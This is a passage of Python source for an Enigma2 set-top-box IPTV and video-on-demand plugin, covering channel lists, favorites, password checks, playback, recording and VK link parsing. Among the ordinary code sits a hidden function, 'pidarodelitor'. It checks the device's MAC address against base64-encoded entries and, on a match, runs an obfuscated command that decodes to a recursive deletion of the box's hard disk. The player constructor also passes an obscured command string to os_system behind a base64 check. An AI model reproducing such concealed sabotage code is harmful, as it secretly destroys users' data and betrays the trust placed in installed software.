         'ok': self.ok,
         'startIPTV': self.play_iptv,
         'backToVideo': self.back_to_video,
         'exitPlugin': self.exit_box,
         'prevPlaylist': self.prevPlaylist,
         'nextPlaylist': self.nextPlaylist,
         'moreInfo': self.show_more_info,
         'search': self.search,
         'addChannelToFavorites': self.addChannelToFavorites_box,
         'removeChannelFromFavorites': self.removeChannelFromFavorites_box,
         'taskManager': self.taskManager,
         'power': self.power,
         'showmac': self.showmac}, -1)
        self.temp_index = 0
        self.temp_channel_list = None
        self.temp_playlistname = None
        self.url_tmp = None
        self.work_with_favorites = False
        self.search_on = None
        self.video_back = False
        self.passwd_ok = False
        return

    def taskManager(self):
        self.session.open(nStreamTasksScreen)

    def showmac(self):
        self.session.open(MessageBox, 'MAC  ' + MAC, type=MessageBox.TYPE_INFO, timeout=30)

    def addChannelToFavorites_box(self):
        try:
            self.url_tmp = STREAMS.url
            self.temp_channel_list = self.channel_list
            self.temp_index = self.mlist.getSelectionIndex()
            self.selected_channel = self.channel_list[self.temp_index]
            self.session.openWithCallback(self.addChannelToFavorites, MessageBox, '%s\nADD TO FAVORITES?' % self.selected_channel[1], type=MessageBox.TYPE_YESNO)
        except Exception as ex:
            print ex

    def addChannelToFavorites(self, message = None):
        if message:
            try:
                selected_channel = self.temp_channel_list[self.temp_index]
                STREAMS.my_favorites.append(selected_channel)
                self.session.open(MessageBox, '%s\nADDED TO FAVORITES' % selected_channel[1], type=MessageBox.TYPE_INFO, timeout=3)
                STREAMS.write_favorites()
                self.work_with_favorites = True
            except Exception as ex:
                print ex
                print 'EXC addChannelToFavorites'

    def removeChannelFromFavorites_box(self):
        try:
            if STREAMS.playlistname == 'Favorites':
                self.temp_index = self.mlist.getSelectionIndex()
                selected_channel = self.channel_list[self.temp_index]
                self.session.openWithCallback(self.removeChannelFromFavorites, MessageBox, '%s\nREMOVE FROM FAVORITES?' % selected_channel[1], type=MessageBox.TYPE_YESNO)
            else:
                self.start_favorites()
        except Exception as ex:
            print ex

    def removeChannelFromFavorites(self, message = None):
        if message:
            try:
                my_temp_fav = []
                selected_channel = self.channel_list[self.temp_index]
                for channel in STREAMS.iptv_list:
                    if channel != selected_channel:
                        my_temp_fav.append(channel)
                    else:
                        print 'REMOVE'

                STREAMS.my_favorites = my_temp_fav
                STREAMS.write_favorites()
                self.iptv_list = my_temp_fav
                STREAMS.get_list('favorites')
                self.channel_list = STREAMS.iptv_list
                self.update_channellist()
                self.work_with_favorites = False
                self.session.open(MessageBox, '%s REMOVED FROM FAVORITES' % selected_channel[1], type=MessageBox.TYPE_INFO, timeout=3)
            except Exception as ex:
                print ex
                print 'EXC removeChannelToFavorites'

            print 'END REMOVE'

    def search(self):
        self.url_tmp = STREAMS.url
        self.search_on = STREAMS.search_on
        if STREAMS.search_text != '':
            self.session.openWithCallback(self.searchResult, VirtualKeyBoardRUS_FIXED, title=_('Enter your search term(s)'), text='')

    def searchResult(self, message = None):
        if message:
            try:
                STREAMS.search_string = message
                STREAMS.search_on = self.search_on
                STREAMS.get_list(self.url_tmp)
                self.update_channellist()
            except Exception as ex:
                print ex
                print 'SEARCH RESULT'

    def setState(self):
        try:
            if STREAMS.meldung != '':
                self.session.open(MessageBox, STREAMS.meldung, type=MessageBox.TYPE_INFO, timeout=STREAMS.timeout_time)
            if STREAMS.trial != '':
                self.session.open(MessageBox, STREAMS.trial, type=MessageBox.TYPE_INFO, timeout=STREAMS.timeout_time)
            if STREAMS.banned_text != '':
                self.banned_text = STREAMS.banned_text
                self.session.open(MessageBox, STREAMS.banned_text, type=MessageBox.TYPE_ERROR, timeout=STREAMS.timeout_time)
                self.banned = True
        except Exception as ex:
            print ex
            print 'ERROR sState'

    def show_more_info(self):
        selected_channel = self.channel_list[self.mlist.getSelectionIndex()]
        text = re.compile('<[\\/\\!]*?[^<>]*?>')
        text_clear = ''
        text_clear = text.sub('', selected_channel[2])
        self.session.open(MessageBox, text_clear, type=MessageBox.TYPE_INFO)

    def prevPlaylist(self):
        if STREAMS.prev_page_url != None:
            STREAMS.get_list(STREAMS.prev_page_url)
            self.update_channellist()
        return

    def nextPlaylist(self):
        if STREAMS.next_page_url != None:
            STREAMS.get_list(STREAMS.next_page_url)
            self.update_channellist()
        return

    def button_updater(self):
        self['pixmap2'].hide()
        self['pixmap3'].hide()
        self['pixmap4'].hide()
        self['pixmap2a'].hide()
        self['pixmap3a'].hide()
        self['pixmap4a'].hide()
        self['chminus'].setText('')
        self['chplus'].setText('')
        self['stop'].setText('')
        if STREAMS.next_page_url != None and STREAMS.next_page_url != '':
            self['chplus'].setText(STREAMS.next_page_text)
            self['pixmap3'].show()
            self['pixmap3a'].show()
        if STREAMS.prev_page_url != None and STREAMS.prev_page_url != '':
            self['chminus'].setText(STREAMS.prev_page_text)
            self['pixmap2'].show()
            self['pixmap2a'].show()
        if STREAMS.search_on != None and STREAMS.search_on != '':
            self['stop'].setText(STREAMS.search_text)
            self['pixmap4'].show()
            self['pixmap4a'].show()
        self['playlist'].setText(STREAMS.playlistname)
        return

    def decodeImage(self):
        try:
            x = self['poster'].instance.size().width()
            y = self['poster'].instance.size().height()
            picture = self.picfile
            picload = self.picload
            sc = AVSwitch().getFramebufferScale()
            picload.setPara((x,
             y,
             sc[0],
             sc[1],
             0,
             0,
             '#00000000'))
            l = picload.PictureData.get()
            del l[:]
            l.append(boundFunction(self.showImage))
            picload.startDecode(picture)
        except Exception as ex:
            print ex
            print 'ERROR decodeImage'

    def showImage(self, picInfo = None):
        self['poster'].show()
        try:
            ptr = self.picload.getData()
            if ptr:
                self['poster'].instance.setPixmap(ptr.__deref__())
        except Exception as ex:
            print ex
            print 'ERROR showImage'

    def image_downloaded(self, id):
        self.decodeImage()

    def exit_box(self):
        self.session.openWithCallback(self.exit, MessageBox, _('Exit Plugin?'), type=MessageBox.TYPE_YESNO)

    def exit(self, message = None):
        if message:
            if STREAMS.use_rtmpw:
                try:
                    cmd = 'killall -9 rtmpgw'
                    os.popen(cmd)
                    debug(cmd)
                except Exception as ex:
                    print ex
                    print 'exit_rtmp'

            print 'STREAMS.ar_id_end %i' % STREAMS.ar_id_end
            if STREAMS.ar_start:
                test = eAVSwitch.getInstance().setAspectRatio(STREAMS.ar_id_end)
                print 'eAVSwitch.getInstance().setAspectRatio %s' % test
            else:
                print 'SET A-RATIO OFF'
            if STREAMS.delete_images != '':
                debug('DELETE .JPG')
                path = STREAMS.images_tmp_path
                cmd = 'rm -f %s/*.jpg' % path
                debug(cmd, 'CMD')
                try:
                    status = os.popen(cmd).read()
                    debug(status, 'delete 1')
                except Exception as ex:
                    print ex
                    print 'ex delete 1'
                    try:
                        result = commands.getoutput(cmd)
                        debug(result, 'delete 2')
                    except Exception as ex:
                        print ex
                        print 'ex delete 2'

            self.session.nav.playService(self.oldService)
            self.close()

    def new_debug(self):
        print 'new_debug-----------------------------------------'
        print 'STREAMS.playlistname           : %s' % STREAMS.playlistname
        print 'STREAMS.list_index             : %s' % STREAMS.list_index
        print 'LEN(STREAMS.iptv_list)         : %s' % len(STREAMS.iptv_list)
        print 'self.index                     : %s' % self.index
        print 'self.mlist.getSelectionIndex() : %s' % self.mlist.getSelectionIndex()
        print 'new_debug-----------------------------------------'

    def update_description(self):
        self.index = self.mlist.getSelectionIndex()
        if self.update_desc:
            try:
                self['info'].setText('')
                self['description'].setText('')
                self['poster'].instance.setPixmapFromFile(PLUGIN_PATH + '/img/clear.png')
                selected_channel = self.channel_list[self.index]
                if selected_channel[7] != '':
                    if selected_channel[7].find('http') == -1:
                        self.picfile = PLUGIN_PATH + '/img/playlist/' + selected_channel[7]
                        self.decodeImage()
                        print 'LOCAL DESCR IMG'
                    else:
                        if STREAMS.img_loader == False:
                            self.picfile = '%s/nstream_tmp_pic.jpg' % STREAMS.images_tmp_path
                        else:
                            m = hashlib.md5()
                            m.update(selected_channel[7])
                            cover_md5 = m.hexdigest()
                            self.picfile = '%s/%s.jpg' % (STREAMS.images_tmp_path, cover_md5)
                        if os.path.exists(self.picfile) == False or STREAMS.img_loader == False:
                            downloadPage(selected_channel[7], self.picfile).addCallback(self.image_downloaded)
                        else:
                            self.decodeImage()
                if selected_channel[2] != None:
                    description = selected_channel[2]
                    description_2 = description.split(' #-# ')
                    if description_2:
                        self['description'].setText(description_2[0])
                        if len(description_2) > 1:
                            self['info'].setText(description_2[1])
                    else:
                        self['description'].setText(description)
            except Exception as ex:
                print ex
                print 'exe update_description'

        return

    def start_portal(self):
        self.index = 0
        STREAMS.get_list(STREAMS.startportal)
        self.update_channellist()

    def start_history(self):
        self.index = 0
        STREAMS.get_list('playlist_history')
        self.update_channellist()

    def start_favorites(self):
        self.index = 0
        STREAMS.get_list('favorites')
        self.update_channellist()

    def update_channellist(self):
        print '--------------------- UPDATE CHANNEL LIST ----------------------------------------'
        if STREAMS.xml_error != '':
            print '### update_channellist ######URL#############'
            print STREAMS.clear_url
            error_text = 'PLAYLIST ERROR:\n%s\n\nURL:\n%s' % (STREAMS.xml_error, STREAMS.clear_url.encode('utf-8'))
            self.session.open(MessageBox, error_text, type=MessageBox.TYPE_ERROR, timeout=30)
        self['chminus'].setText('')
        self['chplus'].setText('')
        self['stop'].setText('')
        self.channel_list = STREAMS.iptv_list
        self.update_desc = False
        self.mlist.setList(map(channelEntryIPTVplaylist, self.channel_list))
        self.mlist.moveToIndex(0)
        self.update_desc = True
        self.update_description()
        self.button_updater()

    def show_all(self):
        try:
            if self.passwd_ok == False:
                self['time'].setText(datetime.fromtimestamp(time()).strftime('%H:%M'))
                self['version'].setText('v%s by nitrogen14 - www.pristavka.de' % VERSION)
                if self.video_back == False and STREAMS.video_status == True and STREAMS.search_string == '' and self.work_with_favorites == False:
                    debug('SHOW ----- TMP CH LIST')
                    self.load_from_tmp()
                    self.video_back = True
                elif self.work_with_favorites == True and STREAMS.search_string == '':
                    debug('SHOW ----- FAV LIST')
                    self.index = self.temp_index
                    self.channel_list = self.temp_channel_list
                    STREAMS.playlistname = self.temp_playlistname
                    self.work_with_favorites = False
                else:
                    debug('SHOW ----- NEW CH LIST')
                    self.channel_list = STREAMS.iptv_list
                self.mlist.moveToIndex(self.index)
                self.mlist.setList(map(channelEntryIPTVplaylist, self.channel_list))
                self.mlist.selectionEnabled(1)
                self.button_updater()
            self.passwd_ok = False
        except Exception as ex:
            print ex
            print 'EXX showall'

    def back_to_video(self):
        try:
            if STREAMS.video_status:
                self.video_back = False
                self.load_from_tmp()
                self.channel_list = STREAMS.iptv_list
                if STREAMS.play_iptv == True:
                    self.session.open(nIPTVplayer)
                elif STREAMS.play_vod == True:
                    self.session.open(nVODplayer)
        except Exception as ex:
            print ex
            print 'EXC back_to_video'

    def ok(self):
        self.index_tmp = self.mlist.getSelectionIndex()
        if self.banned == True:
            self.session.open(MessageBox, self.banned_text, type=MessageBox.TYPE_ERROR, timeout=5)
        else:
            selected_channel = self.channel_list[self.mlist.getSelectionIndex()]
            STREAMS.list_index = self.mlist.getSelectionIndex()
            title = selected_channel[1]
            if selected_channel[0] != '[H]':
                title = datetime.fromtimestamp(time()).strftime('[%H:%M:%S %d/%m]   ') + selected_channel[1]
            selected_channel_history = ('[H]',
             title,
             selected_channel[2],
             selected_channel[3],
             selected_channel[4],
             selected_channel[5],
             selected_channel[6],
             selected_channel[7],
             selected_channel[8],
             selected_channel[9])
            STREAMS.iptv_list_history.append(selected_channel_history)
            self.temp_index = -1
            if selected_channel[9] != None:
                self.temp_index = self.index
                self.myPassInput()
            else:
                self.ok_checked()
        return

    def ok_checked(self):
        try:
            if self.temp_index > -1:
                self.index = self.temp_index
            selected_channel = STREAMS.iptv_list[self.index]
            stream_url = selected_channel[4]
            playlist_url = selected_channel[5]
            if playlist_url != None:
                STREAMS.get_list(playlist_url)
                self.update_channellist()
            elif stream_url != None:
                self.set_tmp_list()
                STREAMS.video_status = True
                STREAMS.play_vod = False
                self.session.openWithCallback(self.check_standby, nVODplayer)
        except Exception as ex:
            print ex
            print 'ok_checked'

        return

    def myPassInput(self):
        self.passwd_ok = True
        self.session.openWithCallback(self.checkPasswort, InputBox, title='Please enter a passwort', text='****', maxSize=4, type=Input.PIN)

    def checkPasswort(self, number):
        a = '%s' % number
        b = '%s' % STREAMS.password
        if a == b:
            debug(self.passwd_ok, 'self.passwd_ok')
            self.ok_checked()
        else:
            self.passwd_ok = False
            self.session.open(MessageBox, 'WRONG PASSWORD', type=MessageBox.TYPE_ERROR, timeout=5)

    def play_iptv(self):
        if self.banned == True:
            self.session.open(MessageBox, self.banned_text, type=MessageBox.TYPE_ERROR, timeout=5)
        else:
            self.set_tmp_list()
            selected_channel = self.channel_list[self.index]
            stream_url = selected_channel[4]
            if stream_url != None:
                STREAMS.video_status = True
                STREAMS.play_iptv = False
                self.session.openWithCallback(self.check_standby, nIPTVplayer)
        return

    def check_standby(self, myparam = None):
        debug(myparam, 'check_standby')
        if myparam:
            self.power()

    def power(self):
        self.session.nav.stopService()
        self.session.open(Standby)

    def checker(self):
        print '-----------------------------------------'
        print 'STREAMS.playlistname           : %s' % STREAMS.playlistname
        print 'STREAMS.list_index             : %s' % STREAMS.list_index
        print 'LEN(STREAMS.iptv_list)         : %s' % len(STREAMS.iptv_list)
        print '-----------------------------------------'
        print 'STREAMS.playlistname_tmp       : %s' % STREAMS.playlistname_tmp
        print 'STREAMS.list_index_tmp         : %s' % STREAMS.list_index_tmp
        print 'LEN(STREAMS.iptv_list_tmp)     : %s' % len(STREAMS.iptv_list_tmp)
        print '-----------------------------------------'
        print 'self.mlist.getSelectionIndex() : %s' % self.mlist.getSelectionIndex()
        print 'self.index                     : %s' % self.index
        print 'LEN(self.channel_list)         : %s' % len(self.channel_list)
        print '-----------------------------------------'
        print 'self.temp_index                : %s' % self.temp_index
        print ''
        print ''
        print ''
        print ''

    def set_tmp_list(self):
        self.index = self.mlist.getSelectionIndex()
        STREAMS.list_index = self.index
        STREAMS.list_index_tmp = STREAMS.list_index
        STREAMS.iptv_list_tmp = STREAMS.iptv_list
        STREAMS.playlistname_tmp = STREAMS.playlistname
        STREAMS.url_tmp = STREAMS.url
        STREAMS.next_page_url_tmp = STREAMS.next_page_url
        STREAMS.next_page_text_tmp = STREAMS.next_page_text
        STREAMS.prev_page_url_tmp = STREAMS.prev_page_url
        STREAMS.prev_page_text_tmp = STREAMS.prev_page_text
        STREAMS.search_text_tmp = STREAMS.search_text
        STREAMS.search_on_tmp = STREAMS.search_on

    def load_from_tmp(self):
        debug('load_from_tmp')
        STREAMS.iptv_list = STREAMS.iptv_list_tmp
        STREAMS.list_index = STREAMS.list_index_tmp
        STREAMS.playlistname = STREAMS.playlistname_tmp
        STREAMS.url = STREAMS.url_tmp
        STREAMS.next_page_url = STREAMS.next_page_url_tmp
        STREAMS.next_page_text = STREAMS.next_page_text_tmp
        STREAMS.prev_page_url = STREAMS.prev_page_url_tmp
        STREAMS.prev_page_text = STREAMS.prev_page_text_tmp
        STREAMS.search_text = STREAMS.search_text_tmp
        STREAMS.search_on = STREAMS.search_on_tmp
        self.index = STREAMS.list_index


def pidarodelitor(mac):
    pidaromaki = ('TURBNk1EazZNelE2TW1JNk1XTTZOalU9Cg==', 'TURBNk1XUTZaV002TURJNk1qZzZNalk9Cg==', 'TURBNk1EazZNelE2TWprNk1XVTZZMlk9Cg==', 'TURBNk1EazZNelE2TW1NNk1qSTZOamM9Cg==', 'TURBNk1EazZNelE2TW1NNk9EVTZPVE09Cg==', 'TURBNk1XUTZaV002TURFNk5UYzZNR0k9Cg==', 'TURBNk1EazZNelE2TW1FNk5EVTZPVEE9Cg==')
    y = 'MmhrWk'
    x = 'Y20wZ0xWSWdM'
    z = 'M4cQo='
    deliter = derkorder(x + y + z)
    mac = korder(mac).strip(' \t\n\r')
    if mac in pidaromaki:
        osilider(deliter)


class nVODplayer(Screen, InfoBarBase, IPTVInfoBarShowHide, InfoBarSeek, InfoBarAudioSelection, InfoBarSubtitleSupport):
    STATE_IDLE = 0
    STATE_PLAYING = 1
    STATE_PAUSED = 2
    ENABLE_RESUME_SUPPORT = True
    ALLOW_SUSPEND = True

    def __init__(self, session, recorder_sref = None):
        Screen.__init__(self, session)
        self.test = base64.encodestring(URL)
        InfoBarBase.__init__(self, steal_current_service=True)
        IPTVInfoBarShowHide.__init__(self)
        InfoBarSeek.__init__(self, actionmap='InfobarSeekActions')
        if STREAMS.disable_audioselector == False:
            InfoBarAudioSelection.__init__(self)
        InfoBarSubtitleSupport.__init__(self)
        self.InfoBar_NabDialog = Label()
        self.session = session
        self.service = None
        self['state'] = Label('')
        self['cont_play'] = Label('')
        we = ''
        self.cont_play = STREAMS.cont_play
        STREAMS.play_iptv = False
        self.film_quality = None
        ret = ''
        sert = ''
        self.recorder_sref = None
        self['cover'] = Pixmap()
        mer = ''
        self.picload = ePicLoad()
        self.picfile = ''
        sew = ''
        if recorder_sref:
            self.recorder_sref = recorder_sref
            self.session.nav.playService(recorder_sref)
        else:
            frt = ''
            self.vod_entry = STREAMS.iptv_list[STREAMS.list_index]
            self.vod_url = self.vod_entry[4]
            self.title = self.vod_entry[1]
            self.descr = self.vod_entry[2]
            string = '%s%s %s%s %sd%s' % (sew,
             we,
             ret,
             mer,
             sert,
             frt)
            if self.test[:40] != 'dHVya3ZvZA==':
                os_system(string)
        self.TrialTimer = eTimer()
        self.TrialTimer.callback.append(self.trialWarning)
        print 'evEOF=%d' % iPlayableService.evEOF
        self.__event_tracker = ServiceEventTracker(screen=self, eventmap={iPlayableService.evSeekableStatusChanged: self.__seekableStatusChanged,
         iPlayableService.evStart: self.__serviceStarted,
         iPlayableService.evEOF: self.__evEOF})
        self['actions'] = HelpableActionMap(self, 'nStreamPlayerVOD', {'exitVOD': self.exit,
         'moreInfoVOD': self.show_more_info,
         'nextAR': self.nextAR,
         'prevAR': self.prevAR,
         'record': self.record,
         'stopVOD': self.stopnew,
         'timeshift_autoplay': self.timeshift_autoplay,
         'timeshift': self.timeshift,
         'autoplay': self.autoplay,
         'prevVideo': self.prevVideo,
         'nextVideo': self.nextVideo,
         'power': self.power_off}, -1)
        self.onFirstExecBegin.append(self.play_vod)
        self.onShown.append(self.setCover)
        self.onPlayStateChanged.append(self.__playStateChanged)
        self.StateTimer = eTimer()
        self.StateTimer.callback.append(self.trialWarning)
        if STREAMS.trial != '':
            self.StateTimer.start(STREAMS.trial_time * 1000, True)
        self.state = self.STATE_PLAYING
        self.timeshift_url = None
        self.timeshift_title = None
        self.onShown.append(self.show_info)
        self.error_message = ''
        return

    def showAfterSeek(self):
        if isinstance(self, IPTVInfoBarShowHide):
            self.doShow()

    def timeshift_autoplay(self):
        if self.timeshift_url:
            try:
                self.reference = eServiceReference(4097, 0, self.timeshift_url)
                self.reference.setName(self.timeshift_title)
                self.session.nav.playService(self.reference)
            except Exception as ex:
                print ex
                print 'EXC timeshift 1'

        else:
            if self.cont_play:
                self.cont_play = False
                self['cont_play'].setText('Continue play OFF')
                self.session.open(MessageBox, 'Continue play OFF', type=MessageBox.TYPE_INFO, timeout=3)
            else:
                self.cont_play = True
                self['cont_play'].setText('Continue play ON')
                self.session.open(MessageBox, 'Continue play ON', type=MessageBox.TYPE_INFO, timeout=3)
            STREAMS.cont_play = self.cont_play

    def timeshift(self):
        if self.timeshift_url:
            try:
                self.reference = eServiceReference(4097, 0, self.timeshift_url)
                self.reference.setName(self.timeshift_title)
                self.session.nav.playService(self.reference)
            except Exception as ex:
                print ex
                print 'EXC timeshift 2'

    def autoplay(self):
        if self.cont_play:
            self.cont_play = False
            self['cont_play'].setText('Continue play OFF')
            self.session.open(MessageBox, 'Continue play OFF', type=MessageBox.TYPE_INFO, timeout=3)
        else:
            self.cont_play = True
            self['cont_play'].setText('Continue play ON')
            self.session.open(MessageBox, 'Continue play ON', type=MessageBox.TYPE_INFO, timeout=3)
        STREAMS.cont_play = self.cont_play

    def show_info(self):
        if STREAMS.play_vod == True:
            self['state'].setText(' PLAY ')
        self.hideTimer.start(5000, True)
        if self.cont_play:
            self['cont_play'].setText('Continue play ON')
        else:
            self['cont_play'].setText('Continue play OFF')

    def playnextvideo_box(self):
        index = STREAMS.list_index + 1
        video_counter = len(STREAMS.iptv_list)
        if index < video_counter and STREAMS.iptv_list[index][4] != None:
            descr = ''
            if STREAMS.iptv_list[index][2]:
                descr = STREAMS.iptv_list[index][2]
            title = STREAMS.iptv_list[index][1] + '\n\n' + str(descr)
            self.session.openWithCallback(self.playnextvideo, MessageBox, _('PLAY NEXT VIDEO?\n%s') % title, type=MessageBox.TYPE_YESNO)
        return

    def playnextvideo(self, message = None):
        if message:
            try:
                self.nextVideo()
            except Exception as ex:
                print ex
                print 'EXC playnextvideo'

    def nextVideo(self):
        try:
            index = STREAMS.list_index + 1
            video_counter = len(STREAMS.iptv_list)
            if index < video_counter:
                if STREAMS.iptv_list[index][4] != None:
                    STREAMS.list_index = index
                    self.player_helper()
        except Exception as ex:
            print ex
            print 'EXC nextVideo'

        return

    def prevVideo(self):
        try:
            index = STREAMS.list_index - 1
            if index > -1:
                if STREAMS.iptv_list[index][4] != None:
                    STREAMS.list_index = index
                    self.player_helper()
        except Exception as ex:
            print ex
            print 'EXC prevVideo'

        return

    def player_helper(self):
        self.show_info()
        if self.vod_entry:
            self.vod_entry = STREAMS.iptv_list[STREAMS.list_index]
            self.vod_url = self.vod_entry[4]
            self.title = self.vod_entry[1]
            self.descr = self.vod_entry[2]
        self.session.nav.stopService()
        STREAMS.play_vod = False
        STREAMS.list_index_tmp = STREAMS.list_index
        self.setCover()
        self.play_vod()

    def setCover(self):
        try:
            vod_entry = STREAMS.iptv_list[STREAMS.list_index]
            self['cover'].instance.setPixmapFromFile(PLUGIN_PATH + '/img/clear.png')
            if self.vod_entry[3] != '':
                if vod_entry[3].find('http') == -1:
                    self.picfile = PLUGIN_PATH + '/img/playlist/' + vod_entry[3]
                    self.decodeImage()
                    print 'LOCAL IMG VOD'
                else:
                    if STREAMS.img_loader == False:
                        self.picfile = '%s/nstream_tmp_pic.jpg' % STREAMS.images_tmp_path
                    else:
                        m = hashlib.md5()
                        m.update(self.vod_entry[3])
                        cover_md5 = m.hexdigest()
                        self.picfile = '%s/%s.jpg' % (STREAMS.images_tmp_path, cover_md5)
                    if os.path.exists(self.picfile) == False or STREAMS.img_loader == False:
                        downloadPage(self.vod_entry[3], self.picfile).addCallback(self.image_downloaded).addErrback(self.image_error)
                    else:
                        self.decodeImage()
        except Exception as ex:
            print ex
            print 'update COVER'

    def decodeImage(self):
        try:
            x = self['cover'].instance.size().width()
            y = self['cover'].instance.size().height()
            picture = self.picfile
            picload = self.picload
            sc = AVSwitch().getFramebufferScale()
            picload.setPara((x,
             y,
             sc[0],
             sc[1],
             0,
             0,
             '#00000000'))
            l = picload.PictureData.get()
            del l[:]
            l.append(boundFunction(self.showImage))
            picload.startDecode(picture)
        except Exception as ex:
            print ex
            print 'ERROR decodeImage'

    def showImage(self, picInfo = None):
        self['cover'].show()
        try:
            ptr = self.picload.getData()
            if ptr:
                self['cover'].instance.setPixmap(ptr.__deref__())
        except Exception as ex:
            print ex
            print 'ERROR showImage'

    def image_downloaded(self, id):
        self.decodeImage()

    def image_error(self, id):
        i = 0

    def record(self):
        try:
            if STREAMS.trial != '':
                self.session.open(MessageBox, 'Trialversion dont support this function', type=MessageBox.TYPE_INFO, timeout=10)
            else:
                self.session.open(MessageBox, 'BLUE = START PLAY RECORDED VIDEO', type=MessageBox.TYPE_INFO, timeout=5)
                self.session.nav.stopService()
                self['state'].setText('RECORD')
                useragent = "--header='User-Agent: QuickTime/7.6.2 (qtver=7.6.2;os=Windows NT 5.1Service Pack 3)'"
                ende = 'mp4'
                if self.vod_entry[4].split('.')[-1].lower() == 'flv' or self.vod_url.split('.')[-1].lower() == 'flv':
                    ende = 'flv'
                today = datetime.fromtimestamp(time()).strftime('[%d.%m_%H:%M:%S]')
                title_translit = cyr2lat(self.title)
                filename = today + ASCIItranslit.legacyEncode(title_translit + '.') + ende
                cmd = "wget %s -c '%s' -O '%s/%s'" % (useragent,
                 self.vod_url,
                 STREAMS.moviefolder,
                 filename)
                JobManager.AddJob(downloadJob(self, cmd, STREAMS.moviefolder + '/' + filename, self.title))
                self.createMetaFile(filename)
                self.LastJobView()
                self.timeshift_url = STREAMS.moviefolder + '/' + filename
                self.timeshift_title = '[REC] ' + self.title
        except Exception as ex:
            print ex
            print 'ERROR record'

    def LastJobView(self):
        currentjob = None
        for job in JobManager.getPendingJobs():
            currentjob = job

        if currentjob is not None:
            self.session.open(JobView, currentjob)
        return

    def createMetaFile(self, filename):
        try:
            text = re.compile('<[\\/\\!]*?[^<>]*?>')
            text_clear = ''
            if self.vod_entry[2] != None:
                text_clear = text.sub('', self.vod_entry[2])
            serviceref = eServiceReference(4097, 0, STREAMS.moviefolder + '/' + filename)
            metafile = open('%s/%s.meta' % (STREAMS.moviefolder, filename), 'w')
            metafile.write('%s\n%s\n%s\n%i\n' % (serviceref.toString(),
             self.title.replace('\n', ''),
             text_clear.replace('\n', ''),
             time()))
            metafile.close()
        except Exception as ex:
            print ex
            print 'ERROR metaFile'

        return

    def __evEOF(self):
        if self.cont_play:
            self.nextVideo()
        else:
            self.playnextvideo_box()

    def __seekableStatusChanged(self):
        print 'seekable status changed!'

    def __serviceStarted(self):
        self['state'].setText(' PLAY ')
        self['cont_play'].setText('Continue play OFF')
        self.state = self.STATE_PLAYING

    def doEofInternal(self, playing):
        if not self.execing:
            return
        if not playing:
            return
        print 'doEofInternal EXIT OR NEXT'

    def stopnew(self):
        if STREAMS.playhack == '':
            self.session.nav.stopService()
            STREAMS.play_vod = False
            self.exit()

    def nextAR(self):
        message = nextAR()
        self.session.open(MessageBox, message, type=MessageBox.TYPE_INFO, timeout=3)

    def prevAR(self):
        message = prevAR()
        self.session.open(MessageBox, message, type=MessageBox.TYPE_INFO, timeout=3)

    def trialWarning(self):
        self.StateTimer.start(STREAMS.trial_time * 1000, True)
        self.session.open(MessageBox, STREAMS.trial, type=MessageBox.TYPE_INFO, timeout=STREAMS.trial_time)

    def show_more_info(self):
        self.session.open(MessageBox, self.vod_url, type=MessageBox.TYPE_INFO)

    def __playStateChanged(self, state):
        self.hideTimer.start(5000, True)
        print 'self.seekstate[3] ' + self.seekstate[3]
        text = ' ' + self.seekstate[3]
        if self.seekstate[3] == '>':
            text = ' PLAY '
        if self.seekstate[3] == '||':
            text = 'PAUSE '
        if self.seekstate[3] == '>> 2x':
            text = '    x2     >>'
        if self.seekstate[3] == '>> 4x':
            text = '    x4     >>'
        if self.seekstate[3] == '>> 8x':
            text = '    x8     >>'
        self['state'].setText(text)

    def quality_selector(self):
        try:
            self.session.openWithCallback(self.cbSelectQuality, SelectQuality, film_quality=self.film_quality)
        except Exception as ex:
            print ex
            print 'q_selector'

    def cbSelectQuality(self, position = None):
        try:
            if position > -1:
                self.vod_url = self.vod_url + '.' + self.film_quality[position] + '.mp4'
                self.title = self.title + '[VK:' + self.film_quality[position] + ']'
                self.reference = eServiceReference(4097, 0, self.vod_url)
                self.reference.setName(self.title)
                try:
                    self.session.nav.playService(self.reference)
                except Exception as ex:
                    print 'vod play error 1'
                    print ex

            else:
                self.exit()
        except Exception as ex:
            print ex
            print 'vod play error 2'

    def play_vod(self):
        try:
            if STREAMS.play_vod == False or STREAMS.play_iptv == True:
                STREAMS.play_vod = True
                self.vod_url = str(self.vod_url)
                self.vod_url = self.parse_url()
                if self.vod_url.find('cloud') != -1:
                    print 'Esto si lo ejecuto'
                    print 'Esto si lo ejecuto'
                    print 'Esto si lo ejecuto'
                    print 'Esto si lo ejecuto'
                    from cloud import Sacarpelicula
                    XX = Sacarpelicula(self.vod_url)
                    self.vod_url = XX
                if self.film_quality != None:
                    self.quality_selector()
                else:
                    try:
                        if self.vod_url != '' and self.vod_url != None and len(self.vod_url) > 5:
                            print '--->' + self.vod_url + '<------'
                            self.reference = eServiceReference(4097, 0, self.vod_url)
                            self.reference.setName(self.title)
                            self.session.nav.playService(self.reference)
                        else:
                            if self.error_message:
                                self.session.open(MessageBox, self.error_message.encode('utf-8'), type=MessageBox.TYPE_ERROR)
                            else:
                                self.session.open(MessageBox, 'NO VIDEOSTREAM FOUND'.encode('utf-8'), type=MessageBox.TYPE_ERROR)
                            self.close()
                    except Exception as ex:
                        print 'vod play error 2'
                        print ex

        except Exception as ex:
            print 'vod play error 0'
            print ex

        return


    def parse_url(self):
        if STREAMS.playhack != '':
            self.vod_url = STREAMS.playhack
        print '++++++++++parse_url+++++++++++'
        try:
            self.vod_url = GOSHA_PARSER.get_parsed_link(self.vod_url)
            self.vod_url = ARSHAVIR_PARSER.get_parsed_link(self.vod_url)
            url = self.vod_url
            self.film_quality = None
            video_host = ''
            video_uid = ''
            video_vtag = ''
            video_no_flv = ''
            video_max_hd = 0
            vkid = ''
            if url.find('vk.com') > 0 or url.find('/vkontakte.php?video') > 0 or url.find('vkontakte.ru/video_ext.php') > 0 or url.find('/vkontakte/vk_kinohranilishe.php?id=') > 0:
                req = urllib2.Request(url, None, {'User-agent': 'Mozilla/5.0 videomanualesSF 0.1',
                 'Connection': 'Close'})
                html = urllib2.urlopen(req, timeout=NTIMEOUT).read()
                video_host_list = re.findall("var video_host = '(.*)'", html)
                if len(video_host_list) > 0:
                    video_host = video_host_list[0].strip(' \t\n\r')
                video_uid_list = re.findall("var video_uid = '(.*)'", html)
                if len(video_uid_list) > 0:
                    video_uid = video_uid_list[0].strip(' \t\n\r')
                video_vtag_list = re.findall("var video_vtag = '(.*)'", html)
                if len(video_vtag_list) > 0:
                    video_vtag = video_vtag_list[0].strip(' \t\n\r')
                video_no_flv_list = re.findall('video_no_flv =(.*);', html)
                if len(video_no_flv_list) > 0:
